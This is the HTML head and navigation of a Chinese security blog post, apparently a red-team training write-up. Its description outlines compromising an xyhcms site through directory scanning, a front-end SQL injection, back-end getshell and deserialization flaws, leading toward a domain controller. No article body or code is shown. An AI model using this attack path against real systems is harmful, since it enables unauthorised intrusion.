<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="scaner从外网到拿下域控前言这是个人moonsec考核的出师文章 信息收集目录扫描打开了站点很明显发现了这是个xyhcms，先使用御剑扫一波目录，未发现敏感信息。 漏洞整理从网上查找该cms的一些相关的漏洞，找到了一个前台SQL注入和一些后台getshell,以及反序列化漏洞。 前台SQL注入：http:&#x2F;&#x2F;althims.com&#x2F;2020&#x2F;02&#x2F;03&#x2F;xyhcms-3-6&#x2F; 后台getshe">
<meta property="og:type" content="article">
<meta property="og:title" content="scaner从外网到拿下域控">
<meta property="og:url" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/index.html">
<meta property="og:site_name" content="兀自">
<meta property="og:description" content="scaner从外网到拿下域控前言这是个人moonsec考核的出师文章 信息收集目录扫描打开了站点很明显发现了这是个xyhcms，先使用御剑扫一波目录，未发现敏感信息。 漏洞整理从网上查找该cms的一些相关的漏洞，找到了一个前台SQL注入和一些后台getshell,以及反序列化漏洞。 前台SQL注入：http:&#x2F;&#x2F;althims.com&#x2F;2020&#x2F;02&#x2F;03&#x2F;xyhcms-3-6&#x2F; 后台getshe">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/eFiDj6ZnDA-I7w_D_zmx58BYFtwNVMRLVWolNtJ3uYw.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/2AhTENzE3OvrZY3JEuQOID-q9LWDkoRzgIrqLeBQ3go.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/0434TErovOItsmPmfHF-sxPxo-gWTuZ-6ula6ewoftY.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/vqMPR-A3881I2hhT0u2Zg9yxN5SL47Q67Mfdx5-xCxM.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/KaMc7sJAAqq0hupbC3YG5-qMTqkJyWdGpjGxIFPvVVc.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/fYTXF1j0zAW7xLY0_XL_3JjJDuz6l9FppNdLwjNsQlU.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/E3fk_uE2hgCWH1pNmmWIlQhE-TrBubkoRt-GLGb-P88.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/PmVtCUB-IQ2Xk_BzDO6xleiXM2H7fHhOjSehl74smIA.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/t22_CJfnGW30lPSRUDfvHVW7eMb-apXIZJCG6FufS5A.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/KRbUGAMappm9vWkUegnjQZ4IYxITmii9VlbjK-SrcLM.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/uJ8rZ6J9WCZjVo2Tt8hwpxtKmU-0Hbvl_1fQ3MUjQ7I.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/DIQWoMJ_NVZj5nrH-RQxTIVoAzdfQ62PVEvBB6495ZU.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/g0QWjEryttjtJuLqTGada2w_u7wKAIvFLTspWp20pAg.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/G52gO9m7CdHkMk_Wo9KYGDCpw5vZFkgOcqm0s9a7JiI.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/VFsSqvesJ50Vn2TN92fkr8MqUInV_KZnG41nyF7GtlQ.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/f-O0vnvwhniqcVbviV0Zk8EF_yrib_rJn6GCImABAVU.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/0GsCqcFShva7QmvL2RNG0h6us9HTnuAzEZxy9aeRgnk.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/nqaOpSbz0k2443kllVsDMaymt_GLT7nRQuAoLTz9H08.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/PFic_qL5EAPqSri-ky1mPd15hIjczPXv593voMBao-Q.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/N8-whXEcfuPedGBGpLZuaOpBROakgXs9gPf7SyxeCeM.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/HXlTS7g_bCuW5Y7ViN8w75f9lQpuhHpNFaA76FvBrJk.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/k552jfshUzyTNZKGWI3TWTNlTuA3e6ht9n82PwuqX8Y.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/8ZKAeFw5nD-b_jmd5S27okLMWTWFcnpaZChBzXFEBLc.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/it2DAINURC-mlCZ3V5-y6_UvBnaIjVO3kjeM6BSfbOg.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/OIsjH26DAQuNhwuKdMt2VeBS0zNvcmMOS1WgIyeJVJQ.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/Ri8oqXFDAYHqHs45rNG6fdPIecZxDlGBhqCA3yKyUBU.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/0434TErovOItsmPmfHF-sxPxo-gWTuZ-6ula6ewoftY.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/SZBzPWuaEwg2KgMJ2DRfUCzUyQr1Z3D8sSosE8wvIDM.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/WH2mecVyNJbzzoE1zOjrj2Xnblu3c2MXtYVfZG-CU44.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/L0WDvpOOl7LFw0pRaueeO3tCs65IYZOetUXuBXRcsC4.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/kBKVzbAF5OEJ5xMoXEL8CFV0yQagBi7O-yLLsPPctdE.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/rXer-1yIWs82BGv9DM9qQ9AmKh53WyzgVFAUDiasgm8.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/cO6t3NlvIIujDXefEUGaNu8WEcOoi2fulIREdXKlslg.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/B8FVni6cWgnLewRSeUdYCcaM_aEAVqOR6re3Waas-YA.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/oSHhuBG6-zHtCordotB0b1TjS2DjWeQlg4UUUJ27DHg.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/XtARS5xrVg26S3AGPxkrRsQ6zsN6pNka9bTyMlqgG4c.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/mv7ty5hN_84pMahlQnrviDZkhn4kupl1XzodsaB_Oj8.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/csmEOScQV0feKNYmSbSAmiStrbzRiFitk8A_ii5xlek.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/hLRd5XlYlxBBYGnE5Lwt-oV5WtKvE1C4YDi5SOh44P0.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/5IWelP2sVKFetOggLmm85OQvRw5VIUCcNl11T1hJLcU.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/3RXKfH7Ggq3M4PMlHI8YpbQc0MupqM5LRt_dO7jpHCg.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/fGZDrkPNwgfSmUCpEor1cjmyRN610YH_3ueCUQdWa7o.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/-PsNJr9G--N4mA2pZjAIEX4UgOLDJz002glz3KrBdwA.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/LkDh5DVi8J-B3exv3wa6L4Ya8opzJP9rbp8H810GvOA.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/R2CSEktkUv_Yc5Esl-tC71x3bHM88WtQZDZyRKh_Gzg.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/7iOKc_4gkq980n4NvudBVS1R4nnJt2fTX2RAXmaggV0.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/3bKhvlYypWqsdO-qoTJdfnvshGWSXMYH3U5IQli6xKA.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/STVtcNugZ7eAtYa--jHPilUMxNEB-istIuiZKUKw37A.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/txCZrvymtSdJNKq0o_i9aBq3Z2TDK0xtfbS57YtC9xU.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/4GZ2YHJxtzYQjitVxWRkxv3c7a32_eDigwzMx2C5SBs.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/BYCQEOfsdKNaYxc3jrsTq6cvNIxQ97ELS28MWxMU5wI.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/GeOukDPTulVZ0JpkJan6sQPyrObTEUZ7R1ejZlDY4ms.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/D8OlFqtWVDKVzJI1hbIrWNV18lzdA67CpQ0X255JcjU.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/OHbsxsWPRDPcX07rVLb8PB5m-TXZhLopv4lKDQIq3PU.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/I04ti2D6FWvj6EIBgtbY0mhPYwZGOWLptH19lrCbkaY.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/nu8fs3DYv54nI_vsUquJmZNn56oSd3vhh4LsUxZEOE4.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/C71x7UxgDlDHLHMyDngbiFLMjQg6zZcANRaFNA7k_4g.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/qwoc2No8vTqDMLfk8BUehvdICGy1T-KPzcLSU7ty8to.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/Jn00cEcF4rNM6lBIxjDN-JlguNcfIqlCT5OttTjovJM.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/9pd4iJnJ7jMQMKLSXfJwTDgbru8y3LAwn7N9FOZoJzw.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/UjfVfqimOexOWlSs-WgDwpre8CvnXStf0vcfbt4iWFc.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/nfI_4BLL_UeR0WLSMxO2ZS68zoEsUqPHq02HakyaonU.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/Y16Fr2UfEVNPHEDfaIm7wUs1WDHAifxi_17-UgZTuEI.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/aquBLN7lk1bUHUfvD0VzlDEjQrbtBAUl3bVV2wRFmrg.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/aGD3koKShSC4eO9FIGA5eGH7RhaBH1ucK_oBiq4JbbQ.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/x0RLhe8FKCkAuqXUHEPkLmZtBIYcxQKSW6QaFQ8M9d4.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/e8VGwT0kwymRqvplCrxidSuN38xz-ftlBGj-uJkxkT8.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/WrB273TRZOFdjOsTfRZ0llY74lgqf8f3iWCHCRD-W9k.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/kEPafJaATAswZpZgVncpDOXKjtqRWGbcfieBHfIxoBQ.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/Q1UlhkwoygUgscOObw4lAlUoo5U2SL1RPTZInYzO6uU.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/0pCg677i6cLEu3f22OL_SfY_Ee0RjPH1yxblWo-NaF0.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/XM4500tDlaOVjwEcf-WxA7fVthY7epCNdiyToEE1JYc.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/DxJumeqo0NIv_I76J-YPhrb5WUsJd37TFZjPKsK2Uy8.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/XM4500tDlaOVjwEcf-WxA7fVthY7epCNdiyToEE1JYc.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/o1r7TvvmDGhrfiu3GgCIL9hwAHzpKaKs0yO6ITa36OA.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/vvjP-3rte4i5egKEKwDpGFMogGF-ohOYSL2uiamslcQ.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/hf4SHpxlcyxWg6QKBa6JuIv6jY1mC0_-ts2elqVy5W0.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/vlZhm2FLGS_qLHLXwAuGSuxdY--o4jIVD_nxXxi3od4.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/vUUw8TyUOu189TGuc8YWqP2wbVyufByk38dZZnJWP38.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/CvxJcyJU5HIFSCEbT2kSqLmUZ5A2i_7jjWIQGsXpF-k.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/47drsqGtQDe_awys4QZYi7lg_C9dMxziC6HU56xBJwo.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/kJeZm6w7d-oxvFuOtMqCmyGSrX3IAR5AGXBQEzUm6pU.png">
<meta property="og:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/UdDZbU-TmNDduh7SdqVM6tX9M8nmHhF0JkHVgAfc0fM.png">
<meta property="article:published_time" content="2022-05-22T02:38:38.000Z">
<meta property="article:modified_time" content="2023-05-23T13:42:35.883Z">
<meta property="article:author" content="Garck3h">
<meta property="article:tag" content="域控">
<meta property="article:tag" content="红蓝对抗">
<meta property="article:tag" content="红队打点">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/eFiDj6ZnDA-I7w_D_zmx58BYFtwNVMRLVWolNtJ3uYw.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>scaner从外网到拿下域控</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">文章</a></li><!--
     --><!--
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2022/06/15/Fasjson%E6%BC%8F%E6%B4%9E%E4%B8%8D%E5%87%BA%E7%BD%91%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2022/05/06/spring-spel%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2022-22963%EF%BC%89/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&text=scaner从外网到拿下域控"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
